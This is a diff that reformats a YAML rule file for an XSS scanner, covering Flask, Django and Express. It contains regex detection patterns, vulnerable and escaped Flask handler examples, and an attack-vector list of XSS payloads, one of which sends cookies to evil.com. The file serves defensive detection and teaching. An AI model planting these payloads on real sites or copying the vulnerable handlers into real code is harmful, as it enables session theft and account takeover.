@@ -10,52 +10,52 @@ description: |
   sanitization or encoding, allowing attackers to inject malicious scripts that execute in victims' browsers.
 
 references:
-  - https://owasp.org/www-community/attacks/xss/
-  - https://cwe.mitre.org/data/definitions/79.html
+- https://owasp.org/www-community/attacks/xss/
+- https://cwe.mitre.org/data/definitions/79.html
 
 affected_languages:
-  - python
-  - javascript
-  - typescript
+- python
+- javascript
+- typescript
 
 affected_frameworks:
-  - flask
-  - django
-  - fastapi
-  - express
-  - nestjs
+- flask
+- django
+- fastapi
+- express
+- nestjs
 
 xss_types:
-  reflected: "XSS where malicious script is reflected off web server immediately"
-  stored: "XSS where malicious script is permanently stored on the target server"
-  dom: "XSS where vulnerability is in client-side code rather than server-side"
+  reflected: XSS where malicious script is reflected off web server immediately
+  stored: XSS where malicious script is permanently stored on the target server
+  dom: XSS where vulnerability is in client-side code rather than server-side
 
 detection:
   static:
-    - pattern: "return.*request\\.(args|form|json|values)"
-      description: Directly returning user input without sanitization
-      confidence: high
-      requires_framework: [flask, fastapi]
+  - pattern: return.*request\.(args|form|json|values)
+    description: Directly returning user input without sanitization
+    confidence: high
+    requires_framework: [flask, fastapi]
 
-    - pattern: "\\{\\{.*request\\..*\\}\\}"
-      description: Template rendering with unescaped user input (Jinja2)
-      confidence: high
-      requires_framework: [flask]
+  - pattern: \{\{.*request\..*\}\}
+    description: Template rendering with unescaped user input (Jinja2)
+    confidence: high
+    requires_framework: [flask]
 
-    - pattern: "render_template_string\\(.*request\\..*\\)"
-      description: Dynamic template rendering with user input
-      confidence: high
+  - pattern: render_template_string\(.*request\..*\)
+    description: Dynamic template rendering with user input
+    confidence: high
 
-    - pattern: "innerHTML.*request\\."
-      description: Direct innerHTML assignment with user input
-      confidence: high
-      requires_language: [javascript, typescript]
+  - pattern: innerHTML.*request\.
+    description: Direct innerHTML assignment with user input
+    confidence: high
+    requires_language: [javascript, typescript]
 
   data_flow:
-    - source: "request.(json|form|args|values|headers|cookies|body)"
-      sink: "(return|render|send|write|innerHTML|outerHTML)"
-      sanitizers:
-        - "(escape|sanitize|clean|filter)"
+  - source: request.(json|form|args|values|headers|cookies|body)
+    sink: (return|render|send|write|innerHTML|outerHTML)
+    sanitizers:
+    - (escape|sanitize|clean|filter)
 
 remediation:
   description: Use proper output encoding and validation
@@ -82,67 +82,67 @@ remediation:
 
 examples:
   vulnerable:
-    - |
-      @app.route('/search')
-      def search():
-          query = request.args.get('q', '')
-          return f"<h1>Results for: {query}</h1>"
+  - |
+    @app.route('/search')
+    def search():
+        query = request.args.get('q', '')
+        return f"<h1>Results for: {query}</h1>"
 
-    - |
-      @app.route('/profile/<username>')
-      def profile(username):
-          return render_template('profile.html', username=username)
+  - |
+    @app.route('/profile/<username>')
+    def profile(username):
+        return render_template('profile.html', username=username)
 
-    - |
-      @app.route('/api/data')
-      def get_data():
-          data = request.json.get('data')
-          return jsonify({"html": f"<div>{data}</div>"})
+  - |
+    @app.route('/api/data')
+    def get_data():
+        data = request.json.get('data')
+        return jsonify({"html": f"<div>{data}</div>"})
 
   secure:
-    - |
-      from markupsafe import escape
+  - |
+    from markupsafe import escape
 
-      @app.route('/search')
-      def search():
-          query = request.args.get('q', '')
-          return f"<h1>Results for: {escape(query)}</h1>"
+    @app.route('/search')
+    def search():
+        query = request.args.get('q', '')
+        return f"<h1>Results for: {escape(query)}</h1>"
 
-    - |
-      <div>{{ username|e }}</div>
+  - |
+    <div>{{ username|e }}</div>
 
-    - |
-      from bleach import clean
+  - |
+    from bleach import clean
 
-      @app.route('/api/data')
-      def get_data():
-          data = request.json.get('data')
-          return jsonify({"html": f"<div>{clean(data)}</div>"})
+    @app.route('/api/data')
+    def get_data():
+        data = request.json.get('data')
+        return jsonify({"html": f"<div>{clean(data)}</div>"})
 
 attack_vectors:
-  - vector: "Reflected XSS"
-    payload: "<script>alert('XSS')</script>"
-    description: Execute script immediately in victim's browser
+- vector: Reflected XSS
+  payload: <script>alert('XSS')</script>
+  description: Execute script immediately in victim's browser
 
-  - vector: "Stored XSS"
-    payload: "<img src=x onerror=alert('XSS')>"
-    description: Persistent XSS stored and served to all visitors
+- vector: Stored XSS
+  payload: <img src=x onerror=alert('XSS')>
+  description: Persistent XSS stored and served to all visitors
 
-  - vector: "Cookie Theft"
-    payload: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
-    description: Steal session cookies for account takeover
+- vector: Cookie Theft
+  payload: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
+  description: Steal session cookies for account takeover
 
-  - vector: "DOM XSS"
-    payload: "#<img src=x onerror=alert('XSS')>"
-    description: XSS that bypasses server-side filtering
+- vector: DOM XSS
+  payload: "#<img src=x onerror=alert('XSS')>"
+  description: XSS that bypasses server-side filtering
 
-  - vector: "Event Handler XSS"
-    payload: "onmouseover=alert('XSS')"
-    description: XSS using HTML event handlers
+- vector: Event Handler XSS
+  payload: onmouseover=alert('XSS')
+  description: XSS using HTML event handlers
 
-  - vector: "Polyglot XSS"
-    payload: "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
-    description: XSS encoded to bypass filters
+- vector: Polyglot XSS
+  payload: '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
+  description: XSS encoded to bypass filters
 
 llm_prompts:
   analyze: |
